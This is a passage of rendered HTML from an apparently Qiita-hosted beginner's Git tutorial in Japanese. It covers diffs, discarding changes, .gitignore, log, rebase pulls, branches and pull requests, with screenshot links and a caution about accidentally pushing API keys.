src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F85c7039b-d149-430b-9c3d-1ed97a97a6ab.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=3404e355f1b251677e1307ab57dac1e7\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F85c7039b-d149-430b-9c3d-1ed97a97a6ab.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=9456b36950a1e61db501196fd485d718 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/85c7039b-d149-430b-9c3d-1ed97a97a6ab.png\"></a></p>\n<h3 data-sourcepos=\"247:1-247:54\">\n<span id=\"ファイルの変更内容差分を確認する\" class=\"fragment\"></span><a href=\"#%E3%83%95%E3%82%A1%E3%82%A4%E3%83%AB%E3%81%AE%E5%A4%89%E6%9B%B4%E5%86%85%E5%AE%B9%E5%B7%AE%E5%88%86%E3%82%92%E7%A2%BA%E8%AA%8D%E3%81%99%E3%82%8B\"><i class=\"fa fa-link\"></i></a>ファイルの変更内容(差分)を確認する</h3>\n<div class=\"code-frame\" data-lang=\"text\" data-sourcepos=\"248:1-250:3\"><div class=\"highlight\"><pre><code>git diff\n</code></pre></div></div>\n<p data-sourcepos=\"252:1-252:122\"><a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Fe2ea1c19-3a2f-4e04-aa1e-113b34d7c4be.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=c1fccaf9143ec2b7e78a0f2ca1a191de\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Fe2ea1c19-3a2f-4e04-aa1e-113b34d7c4be.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=c1fccaf9143ec2b7e78a0f2ca1a191de\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Fe2ea1c19-3a2f-4e04-aa1e-113b34d7c4be.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=62ee31ab15e54c3dcc288a98cddd227f 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/e2ea1c19-3a2f-4e04-aa1e-113b34d7c4be.png\"></a></p>\n<h3 data-sourcepos=\"254:1-254:55\">\n<span id=\"ステージング前の変更内容を消したい\" class=\"fragment\"></span><a href=\"#%E3%82%B9%E3%83%86%E3%83%BC%E3%82%B8%E3%83%B3%E3%82%B0%E5%89%8D%E3%81%AE%E5%A4%89%E6%9B%B4%E5%86%85%E5%AE%B9%E3%82%92%E6%B6%88%E3%81%97%E3%81%9F%E3%81%84\"><i class=\"fa fa-link\"></i></a>ステージング前の変更内容を消したい</h3>\n<div class=\"code-frame\" data-lang=\"text\" data-sourcepos=\"256:1-259:3\"><div class=\"highlight\"><pre><code># 変更を元に戻す（ステージング前の変更を破棄）\ngit checkout ファイル名\n</code></pre></div></div>\n<p data-sourcepos=\"260:1-261:122\">変更破棄前<br>\n<a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Fe17484cb-9bcd-430c-9e9b-80151fa9660b.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=21f53f0462108edef795db6d9847d7ac\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Fe17484cb-9bcd-430c-9e9b-80151fa9660b.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=21f53f0462108edef795db6d9847d7ac\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Fe17484cb-9bcd-430c-9e9b-80151fa9660b.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=5c3494d9369493014e19279a8575afc7 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/e17484cb-9bcd-430c-9e9b-80151fa9660b.png\"></a></p>\n<p data-sourcepos=\"264:1-264:122\"><a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F023c16eb-a082-4c47-973f-7bad42acd31a.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=b659e76d94148a003820493f99e7c790\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F023c16eb-a082-4c47-973f-7bad42acd31a.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=b659e76d94148a003820493f99e7c790\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F023c16eb-a082-4c47-973f-7bad42acd31a.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=5cd254b7d948381d54fa32c61de5805b 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/023c16eb-a082-4c47-973f-7bad42acd31a.png\"></a></p>\n<p data-sourcepos=\"266:1-267:122\">変更破棄後<br>\n<a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Fd1fa70c8-f77f-4b3d-9ffe-9382a60784d2.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=4209a90300df14e54906d3cb44bd18ce\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Fd1fa70c8-f77f-4b3d-9ffe-9382a60784d2.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=4209a90300df14e54906d3cb44bd18ce\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Fd1fa70c8-f77f-4b3d-9ffe-9382a60784d2.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=1070b1008b312bc5a642d28b182b5c5d 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/d1fa70c8-f77f-4b3d-9ffe-9382a60784d2.png\"></a></p>\n<p data-sourcepos=\"269:1-269:122\"><a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F7671a36e-6ad3-42d1-a7de-14ce36cacf64.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=2bfc7eaabc2cbf30414a29ec32738ef8\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F7671a36e-6ad3-42d1-a7de-14ce36cacf64.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=2bfc7eaabc2cbf30414a29ec32738ef8\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F7671a36e-6ad3-42d1-a7de-14ce36cacf64.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=e3f18094aed55cb7b227e6abc28b94d5 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/7671a36e-6ad3-42d1-a7de-14ce36cacf64.png\"></a></p>\n<h2 data-sourcepos=\"271:1-271:25\">\n<span id=\"git-管理から除外\" class=\"fragment\"></span><a href=\"#git-%E7%AE%A1%E7%90%86%E3%81%8B%E3%82%89%E9%99%A4%E5%A4%96\"><i class=\"fa fa-link\"></i></a>Git 管理から除外</h2>\n<ul data-sourcepos=\"272:1-275:0\">\n<li data-sourcepos=\"272:1-273:0\">\n<p data-sourcepos=\"272:3-272:140\">コミットやプッシュしたくない、してはだめなファイルがあるとき、対象のファイルをgit管理外にする</p>\n</li>\n<li data-sourcepos=\"274:1-275:0\">\n<p data-sourcepos=\"274:3-274:99\">.gitignoreファイルを作って、中身に管理外にしたいファイル名を記載する</p>\n</li>\n</ul>\n<h3 data-sourcepos=\"276:1-276:91\">\n<span id=\"すでに追跡されているファイルをgitの管理対象から外したい場合\" class=\"fragment\"></span><a href=\"#%E3%81%99%E3%81%A7%E3%81%AB%E8%BF%BD%E8%B7%A1%E3%81%95%E3%82%8C%E3%81%A6%E3%81%84%E3%82%8B%E3%83%95%E3%82%A1%E3%82%A4%E3%83%AB%E3%82%92git%E3%81%AE%E7%AE%A1%E7%90%86%E5%AF%BE%E8%B1%A1%E3%81%8B%E3%82%89%E5%A4%96%E3%81%97%E3%81%9F%E3%81%84%E5%A0%B4%E5%90%88\"><i class=\"fa fa-link\"></i></a>すでに追跡されているファイルをGitの管理対象から外したい場合</h3>\n<div class=\"code-frame\" data-lang=\"text\" data-sourcepos=\"277:1-279:3\"><div class=\"highlight\"><pre><code>git rm --cached ファイル名\n</code></pre></div></div>\n<p data-sourcepos=\"281:1-281:122\"><a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F7587c472-bd27-4143-8851-fc3ccd98fd7d.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=453183e56e963b4862a4165b9c780eb1\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F7587c472-bd27-4143-8851-fc3ccd98fd7d.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=453183e56e963b4862a4165b9c780eb1\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F7587c472-bd27-4143-8851-fc3ccd98fd7d.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=b90d2ba060a4b9b09ac4262f54a5e2e9 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/7587c472-bd27-4143-8851-fc3ccd98fd7d.png\"></a></p>\n<div data-sourcepos=\"283:1-293:3\" class=\"note alert\">\n<span class=\"fa fa-fw fa-times-circle\"></span><div>\n<p data-sourcepos=\"284:1-284:9\">注意点</p>\n<ul data-sourcepos=\"285:1-292:93\">\n<li data-sourcepos=\"285:1-287:0\">\n<p data-sourcepos=\"285:3-286:82\">ステージングしたあとは<br>\nこれを消したことを再度コミット　pushしないと反映されない</p>\n</li>\n<li data-sourcepos=\"288:1-290:0\">\n<p data-sourcepos=\"288:3-289:79\">pushしたあとはログ上に残ってしまう完全に消すことはできない<br>\nprivateにかえるか、リポジトリを作り直すことも検討が必要</p>\n</li>\n<li data-sourcepos=\"291:1-292:93\">\n<p data-sourcepos=\"291:3-292:93\">本当にpushしてはいけないものは要注意<br>\n悪用されてしまうこともある、APIキーとか…不正請求された例がある</p>\n</li>\n</ul>\n</div>\n</div>\n<h3 data-sourcepos=\"295:1-295:40\">\n<span id=\"コミットメッセージの編集\" class=\"fragment\"></span><a href=\"#%E3%82%B3%E3%83%9F%E3%83%83%E3%83%88%E3%83%A1%E3%83%83%E3%82%BB%E3%83%BC%E3%82%B8%E3%81%AE%E7%B7%A8%E9%9B%86\"><i class=\"fa fa-link\"></i></a>コミットメッセージの編集</h3>\n<div class=\"code-frame\" data-lang=\"text\" data-sourcepos=\"297:1-299:3\"><div class=\"highlight\"><pre><code>git commit --amend\n</code></pre></div></div>\n<p data-sourcepos=\"301:1-301:78\">テキストエディタがでてくるので修正、テキストを閉じる</p>\n<h2 data-sourcepos=\"304:1-304:18\">\n<span id=\"履歴の確認\" class=\"fragment\"></span><a href=\"#%E5%B1%A5%E6%AD%B4%E3%81%AE%E7%A2%BA%E8%AA%8D\"><i class=\"fa fa-link\"></i></a>履歴の確認</h2>\n<div class=\"code-frame\" data-lang=\"text\" data-sourcepos=\"306:1-309:3\"><div class=\"highlight\"><pre><code># コミット履歴を確認\ngit log\n</code></pre></div></div>\n<p data-sourcepos=\"311:1-312:45\">特定のコミットの変更内容を確認<br>\nそのコミット情報の変更がみれる</p>\n<div class=\"code-frame\" data-lang=\"text\" data-sourcepos=\"314:1-317:3\"><div class=\"highlight\"><pre><code># 特定のコミットの変更内容を確認\ngit log -p コミットID\n</code></pre></div></div>\n<h2 data-sourcepos=\"319:1-319:30\">\n<span id=\"コンフリクトの解消\" class=\"fragment\"></span><a href=\"#%E3%82%B3%E3%83%B3%E3%83%95%E3%83%AA%E3%82%AF%E3%83%88%E3%81%AE%E8%A7%A3%E6%B6%88\"><i class=\"fa fa-link\"></i></a>コンフリクトの解消</h2>\n<div class=\"code-frame\" data-lang=\"text\" data-sourcepos=\"321:1-324:3\"><div class=\"highlight\"><pre><code># リベースを使用して変更を取り込む\ngit pull -r origin main\n</code></pre></div></div>\n<p data-sourcepos=\"326:1-326:122\"><a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F540a7abf-dfe7-4968-adb0-10f0b78eac07.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=946e745358ffba12ca244d138d8dac97\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F540a7abf-dfe7-4968-adb0-10f0b78eac07.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=946e745358ffba12ca244d138d8dac97\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F540a7abf-dfe7-4968-adb0-10f0b78eac07.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=4228479271f2c0450d28f4fdf5e882e3 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/540a7abf-dfe7-4968-adb0-10f0b78eac07.png\"></a></p>\n<p data-sourcepos=\"328:1-328:52\">git rebaseが必要？コミットはしたらだめ</p>\n<p data-sourcepos=\"330:1-330:122\"><a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Fe3ace5b4-3fd3-4226-8d21-45df0bc31891.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=b830509616707cb72d72d86258555b58\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Fe3ace5b4-3fd3-4226-8d21-45df0bc31891.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=b830509616707cb72d72d86258555b58\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Fe3ace5b4-3fd3-4226-8d21-45df0bc31891.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=8a23590e952096da93a19278f848883e 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/e3ace5b4-3fd3-4226-8d21-45df0bc31891.png\"></a></p>\n<h2 data-sourcepos=\"332:1-332:36\">\n<span id=\"ブランチプルリクマージ\" class=\"fragment\"></span><a href=\"#%E3%83%96%E3%83%A9%E3%83%B3%E3%83%81%E3%83%97%E3%83%AB%E3%83%AA%E3%82%AF%E3%83%9E%E3%83%BC%E3%82%B8\"><i class=\"fa fa-link\"></i></a>ブランチプルリクマージ</h2>\n<p data-sourcepos=\"334:1-334:55\"><strong>ブランチとは：履歴の分岐ができるよ</strong></p>\n<h3 data-sourcepos=\"336:1-336:43\">\n<span id=\"ブランチ何があるか確認する\" class=\"fragment\"></span><a href=\"#%E3%83%96%E3%83%A9%E3%83%B3%E3%83%81%E4%BD%95%E3%81%8C%E3%81%82%E3%82%8B%E3%81%8B%E7%A2%BA%E8%AA%8D%E3%81%99%E3%82%8B\"><i class=\"fa fa-link\"></i></a>ブランチ何があるか確認する</h3>\n<div class=\"code-frame\" data-lang=\"text\" data-sourcepos=\"337:1-340:3\"><div class=\"highlight\"><pre><code># ブランチ一覧を表示（現在のブランチは * 表示）\n$ git branch\n</code></pre></div></div>\n<h3 data-sourcepos=\"342:1-342:34\">\n<span id=\"新しいブランチを作る\" class=\"fragment\"></span><a href=\"#%E6%96%B0%E3%81%97%E3%81%84%E3%83%96%E3%83%A9%E3%83%B3%E3%83%81%E3%82%92%E4%BD%9C%E3%82%8B\"><i class=\"fa fa-link\"></i></a>新しいブランチを作る</h3>\n<div class=\"code-frame\" data-lang=\"text\" data-sourcepos=\"343:1-346:3\"><div class=\"highlight\"><pre><code># 新しいブランチを作成\n$ git branch -M 作りたいブランチ名\n</code></pre></div></div>\n<p data-sourcepos=\"348:1-348:122\"><a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F67c8d809-7652-43d0-8ee9-5f3a3d8d95d7.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=cabce33a4e110c674a64047b18c94e40\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F67c8d809-7652-43d0-8ee9-5f3a3d8d95d7.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=cabce33a4e110c674a64047b18c94e40\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F67c8d809-7652-43d0-8ee9-5f3a3d8d95d7.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=ef8afcfa2ba99f963a501c8a92dab45a 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/67c8d809-7652-43d0-8ee9-5f3a3d8d95d7.png\"></a></p>\n<p data-sourcepos=\"350:1-350:51\">＊は今現在いるブランチを表している</p>\n<h3 data-sourcepos=\"352:1-352:58\">\n<span id=\"ブランチ変えたいときmainブランチなど\" class=\"fragment\"></span><a href=\"#%E3%83%96%E3%83%A9%E3%83%B3%E3%83%81%E5%A4%89%E3%81%88%E3%81%9F%E3%81%84%E3%81%A8%E3%81%8Dmain%E3%83%96%E3%83%A9%E3%83%B3%E3%83%81%E3%81%AA%E3%81%A9\"><i class=\"fa fa-link\"></i></a>ブランチ変えたいとき(mainブランチなど)</h3>\n<div class=\"code-frame\" data-lang=\"text\" data-sourcepos=\"353:1-356:3\"><div class=\"highlight\"><pre><code># ブランチを切り替える\n$ git switch main\n</code></pre></div></div>\n<p data-sourcepos=\"358:1-358:122\"><a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F66c9edb5-a65a-4567-9c0e-92dc8580e08f.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=15f9199f0e451b0d4a026f2491b88f33\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F66c9edb5-a65a-4567-9c0e-92dc8580e08f.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=15f9199f0e451b0d4a026f2491b88f33\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F66c9edb5-a65a-4567-9c0e-92dc8580e08f.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=9ef584c144357a64a119d7879c7c2fbd 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/66c9edb5-a65a-4567-9c0e-92dc8580e08f.png\"></a></p>\n<h3 data-sourcepos=\"360:1-360:77\">\n<span id=\"pushするときはプッシュしたブランチの名前を指定する\" class=\"fragment\"></span><a href=\"#push%E3%81%99%E3%82%8B%E3%81%A8%E3%81%8D%E3%81%AF%E3%83%97%E3%83%83%E3%82%B7%E3%83%A5%E3%81%97%E3%81%9F%E3%83%96%E3%83%A9%E3%83%B3%E3%83%81%E3%81%AE%E5%90%8D%E5%89%8D%E3%82%92%E6%8C%87%E5%AE%9A%E3%81%99%E3%82%8B\"><i class=\"fa fa-link\"></i></a>pushするときはプッシュしたブランチの名前を指定する</h3>\n<div class=\"code-frame\" data-lang=\"text\" data-sourcepos=\"361:1-364:3\"><div class=\"highlight\"><pre><code># originはリモートの意味、featureブランチ\ngit push origin feature\n</code></pre></div></div>\n<h2 data-sourcepos=\"366:1-366:36\">\n<span id=\"マージとプルリクエスト\" class=\"fragment\"></span><a href=\"#%E3%83%9E%E3%83%BC%E3%82%B8%E3%81%A8%E3%83%97%E3%83%AB%E3%83%AA%E3%82%AF%E3%82%A8%E3%82%B9%E3%83%88\"><i class=\"fa fa-link\"></i></a>マージとプルリクエスト</h2>\n<h3 data-sourcepos=\"367:1-367:56\">\n<span id=\"ブランチの変更情報をmainにマージする\" class=\"fragment\"></span><a href=\"#%E3%83%96%E3%83%A9%E3%83%B3%E3%83%81%E3%81%AE%E5%A4%89%E6%9B%B4%E6%83%85%E5%A0%B1%E3%82%92main%E3%81%AB%E3%83%9E%E3%83%BC%E3%82%B8%E3%81%99%E3%82%8B\"><i class=\"fa fa-link\"></i></a>ブランチの変更情報をmainにマージする</h3>\n<p data-sourcepos=\"369:1-369:140\">featureブランチにpushするとgithub上で以下のダイアログがでてくる。<code>Compare &amp; pull request</code>ボタンを押下する。</p>\n<p data-sourcepos=\"371:1-371:122\"><a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Fcf29de72-553f-469a-8710-af62955f14cd.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=81ca8045efc4a7bac4e8404745eaf43a\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Fcf29de72-553f-469a-8710-af62955f14cd.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=81ca8045efc4a7bac4e8404745eaf43a\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Fcf29de72-553f-469a-8710-af62955f14cd.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=6fa9c671a8bacc0d14f82f53c10f7838 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/cf29de72-553f-469a-8710-af62955f14cd.png\"></a></p>\n<p data-sourcepos=\"373:1-374:122\">タイトルと修正内容を記載する<br>\n<a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F5580e24e-f8af-4ca1-94b4-b3559d8f461d.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=437976f83c5fbb6c7156597aed81f333\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F5580e24e-f8af-4ca1-94b4-b3559d8f461d.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=437976f83c5fbb6c7156597aed81f333\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F5580e24e-f8af-4ca1-94b4-b3559d8f461d.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=a6bf1dc0fe22c303bf530012da1970d6 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/5580e24e-f8af-4ca1-94b4-b3559d8f461d.png\"></a></p>\n<p data-sourcepos=\"377:1-377:39\">これがプルリクエスト！！！</p>\n<p data-sourcepos=\"379:1-380:38\">レビューとかをしてもらってから、mainブランチにマージする（してもらう）<br>\n<code>Merge pull request</code>ボタンを押下</p>\n<p data-sourcepos=\"382:1-382:122\"><a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F2498677f-a5f8-4757-99ea-07a0d0edcdda.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=8f133840c33dd3179def7ec0080f0b14\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F2498677f-a5f8-4757-99ea-07a0d0edcdda.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=8f133840c33dd3179def7ec0080f0b14\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F2498677f-a5f8-4757-99ea-07a0d0edcdda.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=c54fbb6aae0de91f784973caab75bdef 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/2498677f-a5f8-4757-99ea-07a0d0edcdda.png\"></a></p>\n<p data-sourcepos=\"384:1-385:122\">マージされた<br>\n<a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F13d20d72-2ead-453f-80e2-9e9434357416.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=95f237ebc397231d3b6e4ad4101f7e1e\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F13d20d72-2ead-453f-80e2-9e9434357416.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=95f237ebc397231d3b6e4ad4101f7e1e\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F13d20d72-2ead-453f-80e2-9e9434357416.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=a41aae70d51f9b5b8b2237ea4ed26e6f 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/13d20d72-2ead-453f-80e2-9e9434357416.png\"></a></p>\n<p data-sourcepos=\"387:1-388:122\">マージされるとfeatureブランチは不要になるので、<code>Delete branch</code>ボタンで削除<br>\n<a 